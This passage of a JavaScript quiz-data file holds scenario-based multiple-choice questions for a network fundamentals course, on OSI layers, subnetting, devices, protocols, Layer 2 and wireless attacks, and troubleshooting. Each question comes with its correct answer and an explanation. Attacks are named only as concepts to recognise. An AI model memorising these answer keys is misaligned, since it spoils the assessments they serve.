      { id: "nf-q1-4", difficulty: "easy", tags: ["Architecture"], scenario: "A file-sharing app on 12 workstations lets each host both request and serve files without a central server.", question: "What architecture is in use?", options: ["Client-server", "Peer-to-peer", "Three-tier", "Mainframe"], correctAnswer: 1, explanation: "When every endpoint acts as both client and server with no central authority, that is peer-to-peer." },
      { id: "nf-q1-5", difficulty: "medium", tags: ["Devices"], scenario: "A junior analyst asks why traffic between VLAN 10 and VLAN 20 does not pass through the access switch by itself, even though both VLANs are trunked to it.", question: "Which device is required to move that traffic between the two VLANs?", options: ["A hub", "A repeater", "A router (or L3 switch)", "A media converter"], correctAnswer: 2, explanation: "Inter-VLAN traffic must be routed at Layer 3; a plain L2 switch will not forward between different broadcast domains." },
      { id: "nf-q1-6", difficulty: "easy", tags: ["Network Types"], scenario: "A city government interconnects town hall, three libraries, and the police HQ across roughly 8 km using its own fiber runs.", question: "Which classification fits this network?", options: ["LAN", "PAN", "MAN", "WAN"], correctAnswer: 2, explanation: "A network spanning a single city or metropolitan area sits between LAN and WAN — a MAN." },
      { id: "nf-q1-7", difficulty: "medium", tags: ["Topology", "Blast Radius"], scenario: "A malware outbreak on one PC on a legacy coax segment kills communication for every other host on that same cable when it starts flooding.", question: "Which topology is exposed here?", options: ["Star", "Bus", "Mesh", "Point-to-point"], correctAnswer: 1, explanation: "A shared bus segment means one noisy host or a broken backbone impacts every device on that cable." },
      { id: "nf-q1-8", difficulty: "medium", tags: ["Segmentation"], scenario: "The security team wants finance workstations isolated from general users on the same physical switches to limit lateral movement.", question: "What is the most appropriate control?", options: ["Replace the switch with a hub", "Create separate VLANs and enforce routing/ACLs between them", "Move finance to Wi-Fi only", "Disable STP on the switch"], correctAnswer: 1, explanation: "VLANs create separate broadcast domains on shared hardware; ACLs or a firewall then enforce policy between them." },
      { id: "nf-q1-9", difficulty: "easy", tags: ["PAN"], scenario: "A user pairs a headset and a smartwatch to their phone over a few meters via Bluetooth.", question: "What network type is this?", options: ["LAN", "PAN", "WAN", "MAN"], correctAnswer: 1, explanation: "Short-range personal-device connectivity like Bluetooth is a PAN." },
      { id: "nf-q1-10", difficulty: "hard", tags: ["Design"], scenario: "A hospital wants star topology at each floor for easy troubleshooting, plus mesh links between core switches for resilience.", question: "What topology describes this design?", options: ["Pure star", "Pure mesh", "Hybrid (star + mesh)", "Bus"], correctAnswer: 2, explanation: "Combining two or more topologies to gain each one's benefits is a hybrid topology." }
    ]
  },
  {
    quizId: "nf-q2",
    courseId: "network-fundamentals",
    title: "OSI Model",
    description: "Apply the 7-layer OSI model to real triage decisions.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q2-1", difficulty: "easy", tags: ["OSI"], scenario: "During a P1 outage a network engineer says: \"link light is up, we see frames on the wire, but the router isn't forwarding packets to the remote subnet.\"", question: "Which OSI layer is the failure most likely at?", options: ["Layer 1 — Physical", "Layer 2 — Data Link", "Layer 3 — Network", "Layer 7 — Application"], correctAnswer: 2, explanation: "Bits and frames are fine, so L1/L2 are healthy; forwarding between subnets is a Layer 3 (routing) responsibility." },
      { id: "nf-q2-2", difficulty: "easy", tags: ["OSI", "PDU"], scenario: "A packet capture summary lists a unit with source/destination IP, TTL, and no TCP header yet.", question: "What is this PDU called and at which layer?", options: ["Frame — Layer 2", "Packet — Layer 3", "Segment — Layer 4", "Bit — Layer 1"], correctAnswer: 1, explanation: "IP + TTL with no transport header describes an L3 packet." },
      { id: "nf-q2-3", difficulty: "medium", tags: ["Encapsulation"], scenario: "A trainee asks why a single HTTP GET on the wire ends up with Ethernet, IP, and TCP headers wrapped around it.", question: "What is that process called?", options: ["Fragmentation", "Encapsulation", "Compression", "NAT"], correctAnswer: 1, explanation: "Each lower layer wraps the upper-layer PDU with its own header/trailer — that is encapsulation." },
      { id: "nf-q2-4", difficulty: "easy", tags: ["OSI", "Devices"], scenario: "A switch forwards frames using MAC address tables inside a single VLAN.", question: "At which OSI layer does that primary switching function operate?", options: ["Layer 1", "Layer 2", "Layer 3", "Layer 4"], correctAnswer: 1, explanation: "MAC-based frame forwarding is the classic L2 Data Link role." },
      { id: "nf-q2-5", difficulty: "medium", tags: ["OSI"], scenario: "A DLP tool inspects and decrypts TLS to see cleartext HTTP payloads before re-encrypting.", question: "Which layer is primarily responsible for that encryption/decryption in the OSI model?", options: ["Layer 4 — Transport", "Layer 5 — Session", "Layer 6 — Presentation", "Layer 7 — Application"], correctAnswer: 2, explanation: "Encryption, compression, and format translation live at the Presentation layer in OSI." },
      { id: "nf-q2-6", difficulty: "medium", tags: ["OSI"], scenario: "TCP retransmits lost segments and reorders them before delivery.", question: "Which layer provides that reliability?", options: ["Network", "Transport", "Session", "Data Link"], correctAnswer: 1, explanation: "Reliable end-to-end delivery, ordering, and retransmission are Layer 4 (Transport) responsibilities." },
      { id: "nf-q2-7", difficulty: "easy", tags: ["OSI", "Protocols"], scenario: "You're mapping detected protocols in a capture: HTTP, DNS, SMTP.", question: "Which OSI layer do these operate at?", options: ["Layer 4", "Layer 5", "Layer 6", "Layer 7"], correctAnswer: 3, explanation: "User-facing services like HTTP/DNS/SMTP live at the Application layer." },
      { id: "nf-q2-8", difficulty: "medium", tags: ["TCP/IP vs OSI"], scenario: "A vendor doc references the TCP/IP model's \"Network Access\" layer.", question: "Which two OSI layers does that correspond to?", options: ["Session + Presentation", "Physical + Data Link", "Transport + Network", "Application + Session"], correctAnswer: 1, explanation: "TCP/IP's Network Access (aka Link) layer combines OSI L1 and L2." },
      { id: "nf-q2-9", difficulty: "hard", tags: ["Troubleshooting"], scenario: "A user can ping their gateway and reach 8.8.8.8, but www.example.com fails.", question: "Which OSI layer is the most likely root cause?", options: ["Layer 1 — Physical cabling", "Layer 3 — IP routing", "Layer 7 — Application (DNS)", "Layer 2 — MAC learning"], correctAnswer: 2, explanation: "IP works but name resolution fails, so DNS — an Application-layer service — is the likely culprit." },
      { id: "nf-q2-10", difficulty: "easy", tags: ["OSI", "PDU"], scenario: "Data at Layer 2 is wrapped with source/destination MAC and an FCS trailer.", question: "What is that PDU called?", options: ["Segment", "Packet", "Frame", "Bit"], correctAnswer: 2, explanation: "L2 PDUs carrying MACs and an FCS trailer are frames." }
    ]
  },
  {
    quizId: "nf-q3",
    courseId: "network-fundamentals",
    title: "TCP/IP Protocol Suite",
    description: "Scenario-driven understanding of TCP, UDP, IP, and how they show up in triage.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q3-1", difficulty: "easy", tags: ["TCP"], scenario: "A packet capture opens with SYN, SYN-ACK, ACK between 10.0.0.5 and 10.0.0.20.", question: "What is happening?", options: ["TCP connection teardown", "TCP three-way handshake", "UDP handshake", "ICMP echo exchange"], correctAnswer: 1, explanation: "SYN → SYN-ACK → ACK is the canonical TCP three-way handshake establishing a connection." },
      { id: "nf-q3-2", difficulty: "easy", tags: ["UDP", "DNS"], scenario: "You see one small request/response pair to port 53 with no handshake and no retransmit tracking.", question: "Which transport protocol is in use?", options: ["TCP", "UDP", "SCTP", "ICMP"], correctAnswer: 1, explanation: "DNS queries default to UDP/53 — connectionless, low overhead, no handshake." },
      { id: "nf-q3-3", difficulty: "medium", tags: ["TCP Flags"], scenario: "During an incident review, you see a burst of TCP packets with the RST flag set going to a server that never sent SYN-ACKs.", question: "What is most likely happening?", options: ["Normal graceful close", "Port scanning where closed ports respond with RST", "TLS handshake failures", "DNS amplification"], correctAnswer: 1, explanation: "Closed TCP ports respond to unsolicited SYNs with RST — a classic fingerprint of TCP connect/SYN scanning." },
      { id: "nf-q3-4", difficulty: "medium", tags: ["Ports"], scenario: "A workstation is talking outbound on TCP/443 to an unfamiliar IP with a valid TLS handshake but no matching DNS lookup beforehand.", question: "Which is the most suspicious indicator?", options: ["Use of 443", "Absence of prior DNS resolution", "TLS handshake completing", "Outbound direction"], correctAnswer: 1, explanation: "Legitimate browsers resolve names first; direct-to-IP TLS with no DNS is a common C2/beacon pattern." },
      { id: "nf-q3-5", difficulty: "easy", tags: ["UDP"], scenario: "A VoIP vendor recommends UDP for the RTP media stream instead of TCP.", question: "Why?", options: ["UDP encrypts by default", "UDP has no retransmit/handshake delay, keeping latency low", "UDP guarantees delivery", "UDP has better auth"], correctAnswer: 1, explanation: "Real-time media prefers low latency over reliability; UDP avoids handshake and retransmit overhead." },
      { id: "nf-q3-6", difficulty: "medium", tags: ["IP"], scenario: "A packet's TTL is decreasing at each hop and reaches 0 at a mid-path router.", question: "What happens next?", options: ["The packet is silently forwarded", "The router drops it and typically sends ICMP Time Exceeded", "The router increments TTL back up", "The packet becomes UDP"], correctAnswer: 1, explanation: "TTL=0 triggers a drop and (usually) an ICMP Time Exceeded — the mechanism traceroute abuses." },
      { id: "nf-q3-7", difficulty: "medium", tags: ["Ports"], scenario: "You observe outbound connections on TCP/23 from a server that should only speak SSH and HTTPS.", question: "What service is that port associated with, and why is it a concern?", options: ["SSH — expected", "Telnet — cleartext remote shell, generally deprecated", "HTTPS — encrypted", "SMTP — mail"], correctAnswer: 1, explanation: "TCP/23 is Telnet — a cleartext, deprecated remote shell that should be rare in modern environments." },
      { id: "nf-q3-8", difficulty: "hard", tags: ["TCP"], scenario: "A capture shows repeated SYNs from one host to many destination ports on a single target, no ACKs in return.", question: "What activity is this?", options: ["A SYN/port scan", "Normal TCP keepalive", "A DNS zone transfer", "An ARP sweep"], correctAnswer: 0, explanation: "One-to-many SYNs with no completed handshakes is a signature TCP SYN scan." },
      { id: "nf-q3-9", difficulty: "easy", tags: ["Ports"], scenario: "A web app runs on TCP/8443 behind a load balancer, but users hit TCP/443 externally.", question: "Which is the well-known HTTPS port users hit?", options: ["80", "443", "8080", "8443"], correctAnswer: 1, explanation: "HTTPS's well-known port is 443. 8443 is a common alternate for backends." },
      { id: "nf-q3-10", difficulty: "medium", tags: ["ICMP"], scenario: "Ping to a server times out, but TCP/443 to the same host is responsive.", question: "Best explanation?", options: ["The server is offline", "ICMP echo is filtered while TCP/443 is allowed", "DNS is broken", "MAC address is missing"], correctAnswer: 1, explanation: "Many networks block ICMP echo but allow business ports — reachability on TCP/443 shows the host is up." }
    ]
  },
  {
    quizId: "nf-q4",
    courseId: "network-fundamentals",
    title: "IP Addressing & Subnetting",
    description: "Scenario-based subnetting, RFC1918 boundaries, and NAT for security analysts.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q4-1", difficulty: "easy", tags: ["RFC1918"], scenario: "A SIEM alert shows lateral traffic between 10.20.5.14 and 172.16.4.7.", question: "What kind of addresses are these?", options: ["Public IPv4", "Private RFC1918", "APIPA link-local", "Loopback"], correctAnswer: 1, explanation: "10.0.0.0/8 and 172.16.0.0/12 are RFC1918 private ranges." },
      { id: "nf-q4-2", difficulty: "medium", tags: ["Subnetting"], scenario: "You need to isolate a lab of exactly 25 hosts with minimal address waste.", question: "Which prefix length fits best?", options: ["/24 (254 hosts)", "/27 (30 hosts)", "/28 (14 hosts)", "/29 (6 hosts)"], correctAnswer: 1, explanation: "/27 gives 30 usable hosts — the smallest subnet that fits 25 with room to spare." },
      { id: "nf-q4-3", difficulty: "medium", tags: ["Subnetting"], scenario: "Given 192.168.10.0/26, an analyst asks for the broadcast address.", question: "What is it?", options: ["192.168.10.31", "192.168.10.63", "192.168.10.127", "192.168.10.255"], correctAnswer: 1, explanation: "/26 = 64 addresses; first subnet is .0–.63, broadcast is .63." },
      { id: "nf-q4-4", difficulty: "easy", tags: ["NAT"], scenario: "Many internal RFC1918 workstations share a single public IP when browsing the internet.", question: "What mechanism enables this?", options: ["DHCP", "PAT/NAT overload", "ARP", "STP"], correctAnswer: 1, explanation: "Port Address Translation (NAT overload) multiplexes many private hosts behind one public IP using unique source ports." },
      { id: "nf-q4-5", difficulty: "medium", tags: ["APIPA"], scenario: "A workstation self-assigns 169.254.7.19 and cannot reach anything.", question: "What does this indicate?", options: ["Successful DHCP lease", "APIPA fallback — DHCP failed", "Loopback misconfiguration", "IPv6-only network"], correctAnswer: 1, explanation: "169.254.0.0/16 is APIPA, assigned when DHCP fails — a common troubleshooting fingerprint." },
      { id: "nf-q4-6", difficulty: "hard", tags: ["Subnetting"], scenario: "You need to summarize 172.16.16.0/24, 172.16.17.0/24, 172.16.18.0/24, and 172.16.19.0/24 into one route.", question: "What single prefix covers all four?", options: ["172.16.16.0/23", "172.16.16.0/22", "172.16.0.0/16", "172.16.16.0/20"], correctAnswer: 1, explanation: "Four contiguous /24s aligned on a /22 boundary summarize as 172.16.16.0/22." },
      { id: "nf-q4-7", difficulty: "easy", tags: ["IPv6"], scenario: "A new corporate segment uses addresses like 2001:db8:acad::1/64.", question: "How many bits is an IPv6 address?", options: ["32", "64", "96", "128"], correctAnswer: 3, explanation: "IPv6 addresses are 128 bits." },
      { id: "nf-q4-8", difficulty: "medium", tags: ["Subnetting"], scenario: "A host has IP 10.10.10.130 with mask 255.255.255.192.", question: "Which subnet does it belong to?", options: ["10.10.10.0/26", "10.10.10.64/26", "10.10.10.128/26", "10.10.10.192/26"], correctAnswer: 2, explanation: "/26 blocks step by 64: .0, .64, .128, .192. .130 falls in the .128/26 subnet." },
      { id: "nf-q4-9", difficulty: "medium", tags: ["Broadcast"], scenario: "An analyst asks for the broadcast of 172.16.50.0/23.", question: "What is it?", options: ["172.16.50.255", "172.16.51.255", "172.16.52.0", "172.16.63.255"], correctAnswer: 1, explanation: "/23 spans two /24s: 172.16.50.0 – 172.16.51.255, broadcast = 172.16.51.255." },
      { id: "nf-q4-10", difficulty: "hard", tags: ["NAT", "Investigation"], scenario: "Your public web logs show an attack from a single public IP, but the firewall shows dozens of internal RFC1918 clients associated with that IP over time.", question: "What must you correlate to identify a specific internal user?", options: ["Only the public IP", "The NAT translation table entry at the time of the event (public IP + port + timestamp)", "Only the destination port", "The DNS TTL"], correctAnswer: 1, explanation: "Behind PAT, you need the NAT log tying {public IP, public port, timestamp} → internal IP to attribute activity." }
    ]
  },
  {
    quizId: "nf-q5",
    courseId: "network-fundamentals",
    title: "Network Devices",
    description: "Where routers, switches, firewalls, and proxies fit in a real environment.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q5-1", difficulty: "easy", tags: ["Devices"], scenario: "A device blindly repeats every incoming signal out all other ports with no filtering.", question: "What is it?", options: ["Router", "Switch", "Hub", "Firewall"], correctAnswer: 2, explanation: "That's the defining behavior of a hub — a Layer 1 signal repeater." },
      { id: "nf-q5-2", difficulty: "easy", tags: ["Switch"], scenario: "The device forwards frames using a MAC address table and keeps unicast traffic off unrelated ports.", question: "What is it?", options: ["Hub", "Layer 2 switch", "Bridge repeater", "Media converter"], correctAnswer: 1, explanation: "MAC-based frame forwarding within a broadcast domain is a Layer 2 switch." },
      { id: "nf-q5-3", difficulty: "medium", tags: ["Firewall"], scenario: "A next-gen firewall blocks a session because the file inside HTTPS matched a malware signature after TLS inspection.", question: "Which capability is being used?", options: ["Simple stateless ACL", "Stateful inspection only", "Deep packet inspection (DPI) with TLS decryption", "MAC filtering"], correctAnswer: 2, explanation: "Inspecting file content inside decrypted TLS is DPI plus TLS interception — an NGFW capability." },
      { id: "nf-q5-4", difficulty: "medium", tags: ["Proxy"], scenario: "All employee web traffic is transparently redirected through a forward proxy that logs URLs and blocks categories.", question: "Which control is this?", options: ["Reverse proxy", "Forward web proxy / secure web gateway", "IDS", "Load balancer"], correctAnswer: 1, explanation: "A device that fronts internal users going outbound is a forward proxy / secure web gateway." },
      { id: "nf-q5-5", difficulty: "medium", tags: ["IDS/IPS"], scenario: "A sensor sees a matching signature but only logs it; the traffic still reaches the target.", question: "Is this an IDS or IPS?", options: ["IPS — because it blocks", "IDS — because it only detects", "Firewall — always blocks", "Router — never inspects"], correctAnswer: 1, explanation: "Detects but does not block = IDS. IPS would drop or reset the session inline." },
      { id: "nf-q5-6", difficulty: "hard", tags: ["Router"], scenario: "A packet destined for 8.8.8.8 leaves a host and must transit multiple ISPs.", question: "Which device is primarily responsible for choosing the next hop between networks?", options: ["Hub", "Switch", "Router", "Repeater"], correctAnswer: 2, explanation: "Layer 3 forwarding between networks based on IP routing tables is the router's job." },
      { id: "nf-q5-7", difficulty: "easy", tags: ["Load Balancer"], scenario: "External clients hit one VIP that distributes requests across 6 web servers in the DMZ.", question: "What device performs this?", options: ["IDS", "Load balancer / reverse proxy", "Router", "Hub"], correctAnswer: 1, explanation: "Fronting a farm behind a single VIP and distributing sessions is load balancer / reverse proxy behavior." },
      { id: "nf-q5-8", difficulty: "medium", tags: ["WAP"], scenario: "A rogue device broadcasts the corporate SSID from the parking lot to lure users onto its wireless.", question: "What attack is this?", options: ["ARP spoofing", "Evil twin", "MAC flooding", "DHCP snooping"], correctAnswer: 1, explanation: "A rogue AP impersonating a legitimate SSID is an evil twin attack." },
      { id: "nf-q5-9", difficulty: "medium", tags: ["Segmentation"], scenario: "Security wants server VLANs separated from user VLANs with policy enforcement between them.", question: "Which device typically enforces that policy?", options: ["A hub", "A Layer 3 firewall or L3 switch with ACLs", "A Layer 1 repeater", "A DHCP relay"], correctAnswer: 1, explanation: "Enforcing policy between VLANs happens at L3 — firewall or L3 switch with ACLs." },
      { id: "nf-q5-10", difficulty: "hard", tags: ["Switch Security"], scenario: "An attacker floods a switch with thousands of fake source MAC addresses; the switch starts flooding all frames to every port so the attacker can sniff.", question: "What attack is this?", options: ["ARP spoofing", "MAC flooding / CAM overflow", "DHCP starvation", "STP root hijack"], correctAnswer: 1, explanation: "Overflowing the CAM table so the switch fails open into hub-like behavior is MAC flooding." }
    ]
  },
  {
    quizId: "nf-q6",
    courseId: "network-fundamentals",
    title: "Application Protocols",
    description: "Recognize protocols on the wire and their security implications.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q6-1", difficulty: "easy", tags: ["DNS"], scenario: "A workstation queries a domain and receives an A record.", question: "What does an A record return?", options: ["A mail server", "A canonical alias", "An IPv4 address for the hostname", "An IPv6 address"], correctAnswer: 2, explanation: "A records map a hostname → IPv4. AAAA is the IPv6 equivalent." },
      { id: "nf-q6-2", difficulty: "medium", tags: ["DNS", "C2"], scenario: "A host makes hundreds of DNS queries per minute to long, high-entropy subdomains of a single parent domain.", question: "What is this most consistent with?", options: ["Normal browsing", "DNS tunneling / covert C2", "NTP sync", "Windows Update"], correctAnswer: 1, explanation: "High-volume, high-entropy subdomains to one parent are a classic DNS tunneling / covert channel pattern." },
      { id: "nf-q6-3", difficulty: "easy", tags: ["HTTP/S"], scenario: "You see cleartext credentials in a URL query string over TCP/80.", question: "Which protocol is in use and what's the risk?", options: ["HTTPS — safely encrypted", "HTTP — cleartext, credentials exposed on-path", "SSH — encrypted", "SFTP — encrypted"], correctAnswer: 1, explanation: "TCP/80 is HTTP (cleartext); credentials in the URL are visible to any on-path observer." },
      { id: "nf-q6-4", difficulty: "medium", tags: ["Email"], scenario: "A mail server accepts outbound messages from clients on TCP/587 with STARTTLS.", question: "Which protocol/function is this?", options: ["POP3 retrieval", "IMAP retrieval", "SMTP submission (authenticated)", "LDAP bind"], correctAnswer: 2, explanation: "TCP/587 is the authenticated SMTP submission port used by mail clients to send outbound mail." },
      { id: "nf-q6-5", difficulty: "medium", tags: ["Remote Access"], scenario: "An old device only supports remote CLI over TCP/23 with no encryption.", question: "Which protocol and recommended replacement?", options: ["Telnet — replace with SSH", "SSH — already secure", "HTTPS — already secure", "SFTP — already secure"], correctAnswer: 0, explanation: "TCP/23 = Telnet (cleartext). SSH (TCP/22) is the standard secure replacement." },
      { id: "nf-q6-6", difficulty: "medium", tags: ["File Transfer"], scenario: "You need to move sensitive files between two Linux hosts with encryption in transit.", question: "Which is appropriate?", options: ["FTP over TCP/21", "TFTP over UDP/69", "SFTP or SCP over SSH", "HTTP over TCP/80"], correctAnswer: 2, explanation: "SFTP and SCP run over SSH and encrypt both auth and payload." },
      { id: "nf-q6-7", difficulty: "medium", tags: ["DNS Records"], scenario: "A phishing investigation needs to identify the domain's mail servers to spot spoofing.", question: "Which DNS record type do you check?", options: ["A", "MX", "TXT (SPF only)", "PTR"], correctAnswer: 1, explanation: "MX records identify the domain's mail exchangers." },
      { id: "nf-q6-8", difficulty: "hard", tags: ["Email Auth"], scenario: "A message failed alignment against the sending domain's published policy that says \"reject on failure\".", question: "Which email authentication standard is this?", options: ["SPF only", "DKIM only", "DMARC", "SMTP AUTH"], correctAnswer: 2, explanation: "DMARC ties SPF/DKIM to alignment and defines the reject/quarantine/none policy at the domain owner's discretion." },
      { id: "nf-q6-9", difficulty: "easy", tags: ["DHCP"], scenario: "A new laptop boots and broadcasts to find IP configuration.", question: "Which sequence is DHCP?", options: ["SYN, SYN-ACK, ACK", "Discover, Offer, Request, Ack (DORA)", "GET, 200 OK", "SPF, DKIM, DMARC"], correctAnswer: 1, explanation: "DHCP uses the DORA exchange to lease an address and options." },
      { id: "nf-q6-10", difficulty: "hard", tags: ["Encrypted DNS"], scenario: "A user's browser sends DNS queries encrypted inside HTTPS to a cloud resolver, bypassing corporate DNS logging.", question: "What is this technology?", options: ["DNSSEC only", "DoH (DNS over HTTPS)", "Plain DNS/53", "mDNS"], correctAnswer: 1, explanation: "DoH tunnels DNS inside HTTPS to a resolver, which frustrates on-prem DNS monitoring." }
    ]
  },
  {
    quizId: "nf-q7",
    courseId: "network-fundamentals",
    title: "Ethernet & Data Link",
    description: "MAC, ARP, VLANs, and L2 attacks in real triage scenarios.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q7-1", difficulty: "easy", tags: ["MAC"], scenario: "A frame's source address is 00:1A:2B:3C:4D:5E.", question: "How many bits is a MAC address?", options: ["32", "48", "64", "128"], correctAnswer: 1, explanation: "MAC addresses are 48 bits (6 bytes)." },
      { id: "nf-q7-2", difficulty: "medium", tags: ["ARP"], scenario: "A host in 192.168.1.0/24 needs to send an IP packet to 192.168.1.50 but doesn't know its MAC.", question: "What does it do?", options: ["Sends an ICMP echo", "Broadcasts an ARP request \"who has 192.168.1.50\"", "Queries DNS", "Uses DHCP DORA"], correctAnswer: 1, explanation: "ARP resolves L3 IP → L2 MAC on the local segment via a broadcast request." },
      { id: "nf-q7-3", difficulty: "hard", tags: ["ARP Spoofing"], scenario: "Two hosts on a LAN start seeing the gateway's IP mapped to an attacker's MAC in their ARP tables.", question: "What is this attack?", options: ["MAC flooding", "ARP spoofing / poisoning enabling MITM", "STP TCN storm", "VLAN hopping"], correctAnswer: 1, explanation: "Forging ARP replies to bind the gateway IP to the attacker's MAC steers victim traffic through the attacker (MITM)." },
      { id: "nf-q7-4", difficulty: "medium", tags: ["VLAN"], scenario: "A trunk between two switches must carry VLANs 10, 20, and 30.", question: "Which standard tags those frames on the trunk?", options: ["802.11", "802.1Q", "802.1X", "802.3ad"], correctAnswer: 1, explanation: "IEEE 802.1Q inserts a VLAN tag into Ethernet frames on trunk links." },
      { id: "nf-q7-5", difficulty: "medium", tags: ["802.1X"], scenario: "Users must authenticate to the switch port before it grants them access to any VLAN.", question: "Which standard provides port-based network access control?", options: ["802.11", "802.1Q", "802.1X", "802.3"], correctAnswer: 2, explanation: "802.1X is port-based NAC — supplicant, authenticator, RADIUS server." },
      { id: "nf-q7-6", difficulty: "medium", tags: ["MTU"], scenario: "A user complains that VPN traffic breaks large uploads while small pings work.", question: "What Layer 2 concept is most likely responsible?", options: ["MAC filtering", "MTU / fragmentation issues from VPN overhead", "802.1X", "STP re-election"], correctAnswer: 1, explanation: "VPN encapsulation reduces effective MTU; large packets get fragmented or dropped without PMTUD." },
      { id: "nf-q7-7", difficulty: "medium", tags: ["STP"], scenario: "After adding a redundant switch link, the network briefly loops and floods until it stabilizes.", question: "Which protocol prevents L2 loops in switched networks?", options: ["OSPF", "STP (Spanning Tree Protocol)", "BGP", "HSRP"], correctAnswer: 1, explanation: "STP/RSTP blocks redundant paths at L2 to prevent broadcast storms." },
      { id: "nf-q7-8", difficulty: "hard", tags: ["VLAN Hopping"], scenario: "An attacker on an access port sends double-tagged frames that end up delivered into a VLAN they shouldn't reach.", question: "What technique is this?", options: ["ARP spoofing", "Double-tagging VLAN hopping", "MAC flooding", "DHCP starvation"], correctAnswer: 1, explanation: "Double-tagging exploits native VLAN handling on trunks to leak frames into other VLANs." },
      { id: "nf-q7-9", difficulty: "easy", tags: ["Broadcast Domain"], scenario: "A single VLAN with 300 hosts has heavy broadcast traffic slowing everyone down.", question: "What is the standard fix?", options: ["Add a hub", "Split into multiple smaller VLANs to shrink broadcast domains", "Disable STP", "Set MTU to 500"], correctAnswer: 1, explanation: "Broadcast domain size scales with VLAN size; segment into smaller VLANs to reduce noise." },
      { id: "nf-q7-10", difficulty: "medium", tags: ["Cabling"], scenario: "You need a copper Ethernet run and want the standard maximum reliable length.", question: "What is the standard limit for Cat5e/Cat6?", options: ["50 m", "100 m", "200 m", "500 m"], correctAnswer: 1, explanation: "Standard copper Ethernet segments cap at 100 meters (Cat5e/Cat6/Cat6a)." }
    ]
  },
  {
    quizId: "nf-q8",
    courseId: "network-fundamentals",
    title: "Wireless Networking",
    description: "Wi-Fi standards and wireless attack scenarios.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q8-1", difficulty: "easy", tags: ["Wi-Fi"], scenario: "A corporate network runs modern Wi-Fi with PMF and SAE authentication.", question: "Which security standard is this?", options: ["WEP", "WPA", "WPA2-Personal", "WPA3"], correctAnswer: 3, explanation: "SAE (Simultaneous Authentication of Equals) and mandatory PMF are WPA3 features." },
      { id: "nf-q8-2", difficulty: "medium", tags: ["Wi-Fi Auth"], scenario: "Enterprise Wi-Fi authenticates each user with unique credentials against a RADIUS server using EAP.", question: "Which mode is this?", options: ["WPA2-Personal (PSK)", "WPA2-Enterprise (802.1X/EAP)", "Open network", "WEP shared key"], correctAnswer: 1, explanation: "Per-user identity with RADIUS/EAP is WPA2/3-Enterprise." },
      { id: "nf-q8-3", difficulty: "medium", tags: ["Rogue AP"], scenario: "A user connects to \"CorpWiFi\" in the lobby but ends up on an attacker's AP that mimics the corporate SSID.", question: "What attack?", options: ["MAC flooding", "Evil twin", "ARP spoofing", "DHCP starvation"], correctAnswer: 1, explanation: "Impersonating a legitimate SSID with a rogue AP is an evil twin attack." },
      { id: "nf-q8-4", difficulty: "hard", tags: ["Deprecated"], scenario: "A pentest report flags a Wi-Fi network as easily broken in minutes due to RC4 and weak IVs.", question: "Which legacy protocol is this?", options: ["WPA3", "WPA2", "WPA", "WEP"], correctAnswer: 3, explanation: "WEP's RC4 + small IVs make it trivially breakable and it's long-deprecated." },
      { id: "nf-q8-5", difficulty: "medium", tags: ["Deauth"], scenario: "An attacker sends spoofed management frames that kick clients off an AP repeatedly, then captures the reconnection handshake.", question: "What attack chain is this?", options: ["Beacon injection only", "Deauthentication attack + handshake capture for offline cracking", "MAC flood", "ARP spoof"], correctAnswer: 1, explanation: "Deauth frames force clients to re-associate, exposing the 4-way handshake for offline cracking." },
      { id: "nf-q8-6", difficulty: "easy", tags: ["SSID"], scenario: "A team hides a network by disabling SSID broadcast.", question: "Is this a strong security control?", options: ["Yes, it hides the network completely", "No — SSID is easily discovered in association traffic; it's obscurity, not security", "Yes, only WPA3 clients see it", "It replaces the need for a passphrase"], correctAnswer: 1, explanation: "Hidden SSIDs are still discoverable; treat as obscurity — real controls are strong auth + encryption." },
      { id: "nf-q8-7", difficulty: "medium", tags: ["Bands"], scenario: "An office wants higher throughput and less interference from consumer devices on the 2.4 GHz band.", question: "Which band is generally preferred for that?", options: ["2.4 GHz", "5 GHz", "900 MHz", "60 MHz"], correctAnswer: 1, explanation: "5 GHz has more non-overlapping channels and less consumer congestion than 2.4 GHz." },
      { id: "nf-q8-8", difficulty: "medium", tags: ["Guest Wi-Fi"], scenario: "A guest network should let visitors reach the internet but never internal file servers.", question: "Best design?", options: ["Same VLAN as employees", "Separate VLAN/SSID with ACLs blocking internal subnets, only internet allowed", "No auth at all, flat network", "Bridged to management VLAN"], correctAnswer: 1, explanation: "Guest SSIDs belong on an isolated VLAN with policy allowing only internet egress." },
      { id: "nf-q8-9", difficulty: "hard", tags: ["KRACK"], scenario: "A vulnerability advisory describes forced nonce reuse in the WPA2 4-way handshake letting attackers decrypt frames.", question: "What is this class of attack?", options: ["KRACK against WPA2", "Evil twin", "SQL injection", "SYN flood"], correctAnswer: 0, explanation: "KRACK exploits nonce reuse in the WPA2 handshake — mitigated by patched clients/APs and by moving to WPA3." },
      { id: "nf-q8-10", difficulty: "easy", tags: ["Signal"], scenario: "A user in a far corner reports very low throughput and intermittent drops from one AP.", question: "Most likely cause?", options: ["Too much bandwidth", "Weak signal / poor coverage — add or reposition APs", "Wrong DNS", "MAC filtering"], correctAnswer: 1, explanation: "Distance + obstacles degrade SNR; extend or reposition APs to fix the coverage hole." }
    ]
  },
  {
    quizId: "nf-q9",
    courseId: "network-fundamentals",
    title: "Network Troubleshooting",
    description: "Structured troubleshooting scenarios using ping, traceroute, DNS, and captures.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "nf-q9-1", difficulty: "easy", tags: ["Tools"], scenario: "You need to see each router hop on the path to 8.8.8.8 with per-hop latency.", question: "Which tool?", options: ["ping", "traceroute / tracert", "nslookup", "netstat"], correctAnswer: 1, explanation: "traceroute reveals path and per-hop RTT by manipulating TTL." },
      { id: "nf-q9-2", difficulty: "medium", tags: ["Methodology"], scenario: "A user can't reach an internal app. You start by checking cable/link, then IP config, then routing, then DNS, then app port.", question: "Which methodology are you following?", options: ["Top-down OSI", "Bottom-up OSI", "Random guessing", "Change-management only"], correctAnswer: 1, explanation: "Starting at L1 and moving up the stack is bottom-up OSI troubleshooting." },
